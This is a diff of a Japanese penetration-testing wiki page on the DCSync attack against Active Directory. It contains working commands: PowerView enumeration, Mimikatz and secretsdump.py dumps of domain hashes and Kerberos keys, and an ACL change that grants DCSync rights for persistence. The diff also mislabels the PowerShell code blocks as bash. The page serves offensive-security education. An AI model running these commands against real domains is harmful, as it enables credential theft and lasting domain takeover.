@@ -6,47 +6,47 @@
 
 **DCSync** 権限は、ドメイン自体に対して以下の権限を持つことを意味します: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** および **Replicating Directory Changes In Filtered Set**。
 
-**DCSyncに関する重要な注意事項:**
+**DCSync に関する重要な注意事項:**
 
-- **DCSync攻撃は、ドメインコントローラーの動作をシミュレートし、他のドメインコントローラーに情報を複製するよう要求します**。これは、ディレクトリ複製サービスリモートプロトコル (MS-DRSR) を使用します。MS-DRSRはActive Directoryの有効かつ必要な機能であるため、オフにしたり無効にしたりすることはできません。
+- **DCSync 攻撃は、ドメインコントローラーの動作をシミュレートし、他のドメインコントローラーに情報を複製するよう要求します**。これはディレクトリ複製サービスリモートプロトコル (MS-DRSR) を使用します。MS-DRSR は Active Directory の有効かつ必要な機能であるため、オフにしたり無効にしたりすることはできません。
 - デフォルトでは、**Domain Admins, Enterprise Admins, Administrators, および Domain Controllers** グループのみが必要な特権を持っています。
-- もしアカウントのパスワードが可逆暗号化で保存されている場合、Mimikatzにはパスワードを平文で返すオプションがあります。
+- もしアカウントのパスワードが可逆暗号化で保存されている場合、Mimikatz にはパスワードを平文で返すオプションがあります。
 
 ### Enumeration
 
-`powerview`を使用して、これらの権限を持つユーザーを確認します:
-```powershell
+`powerview` を使用して、これらの権限を持つユーザーを確認します:
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
 ### ローカルでのエクスプロイト
-```powershell
+```bash
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 ### リモートでのエクスプロイト
-```powershell
+```bash
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
 [-history] #To dump password history, may be helpful for offline password cracking
 ```
-`-just-dc` は3つのファイルを生成します：
+`-just-dc` は 3 つのファイルを生成します：
 
-- **NTLMハッシュ**を含むファイル
-- **Kerberosキー**を含むファイル
-- [**可逆暗号化**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)が有効なアカウントのNTDSからの平文パスワードを含むファイル。可逆暗号化を持つユーザーを取得するには、次のコマンドを使用します。
+- **NTLM ハッシュ** を含むファイル
+- **Kerberos キー** を含むファイル
+- NTDS からの平文パスワードを含むファイルで、[**可逆暗号化**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) が有効なアカウントのものです。可逆暗号化が有効なユーザーを取得するには、次のコマンドを使用します。
 
-```powershell
+```bash
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 ```
 
-### 永続性
+### Persistence
 
-ドメイン管理者であれば、`powerview`の助けを借りて、任意のユーザーにこの権限を付与できます：
-```powershell
+ドメイン管理者であれば、`powerview` を使用して任意のユーザーにこの権限を付与できます：
+```bash
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
-次に、(「ObjectType」フィールド内に特権の名前が表示されるはずです) の出力で、ユーザーが3つの特権を正しく割り当てられているかどうかを**確認できます**:
-```powershell
+次に、**ユーザーに3つの特権が正しく割り当てられているかどうかを確認**するには、(「ObjectType」フィールド内に特権の名前が表示されるはずです) の出力でそれらを探します:
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
 ### Mitigation
